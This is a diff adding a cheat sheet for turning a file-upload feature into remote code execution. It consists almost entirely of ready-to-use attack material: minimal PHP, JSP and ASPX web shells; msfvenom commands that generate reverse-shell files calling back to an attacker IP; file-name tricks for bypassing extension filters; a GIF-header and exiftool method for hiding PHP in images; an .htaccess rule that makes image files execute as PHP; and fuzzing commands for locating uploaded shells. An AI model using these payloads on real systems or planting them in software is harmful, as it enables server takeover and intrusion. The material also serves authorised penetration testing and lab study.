@@ -1,0 +1,40 @@
+# File upload -> code execution. Get something executable written, then reach its URL.
+
+## Minimal web shells (drop, then browse with ?0=id  or  ?c=id)
+PHP:   <?php system($_GET[0]); ?>
+PHP:   <?=`$_GET[0]`?>
+PHP:   <?php echo shell_exec($_REQUEST['c']); ?>
+JSP:   <% Runtime.getRuntime().exec(request.getParameter("c")); %>
+JSP:   <%@ page import="java.util.*,java.io.*"%><% Process p=Runtime.getRuntime().exec(request.getParameter("c"));DataInputStream d=new DataInputStream(p.getInputStream());String s=null;while((s=d.readLine())!=null){out.println(s);} %>
+ASPX:  <%@ Page Language="C#"%><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>
+# Kali ships full shells in /usr/share/webshells/{php,jsp,aspx,asp}
+
+## msfvenom (allowed payload generator) — when you want a reverse shell file
+msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=PORT -f raw -o shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f raw -o shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f war -o shell.war   # deploy to Tomcat /manager
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f aspx -o shell.aspx
+
+## Extension bypass
+shell.php.jpg          # double extension (server runs the last OR the first, depending)
+shell.pHp  shell.PhP   # case
+shell.phtml .php3 .php4 .php5 .php7 .pht .phar   # alternate PHP-executable extensions
+shell.asp;.jpg   shell.aspx;1.jpg                # IIS semicolon
+shell.php%00.jpg   shell.php%20   shell.php.     # null byte (legacy) / trailing space or dot
+shell.php:.jpg     # NTFS alternate data stream
+
+## Content-Type / magic-byte bypass
+# keep filename=shell.php but set the part's Content-Type: image/png
+# prepend a real magic header so content sniffing passes:
+GIF89a;<?php system($_GET[0]); ?>
+# embed PHP in real image metadata:
+exiftool -Comment='<?php system($_GET[0]); ?>' clean.png -o shell.php.png
+
+## .htaccess trick (Apache + mod_php, when you can upload .htaccess)
+# upload .htaccess containing:
+AddType application/x-httpd-php .jpg
+# then upload shell.jpg (PHP inside) -> it executes as PHP
+
+## Finding where it landed
+# common dirs: /uploads /files /images /avatars /tmp /media /assets
+# read the upload response/Location header; fuzz: ffuf -u URL/uploads/FUZZ -w list
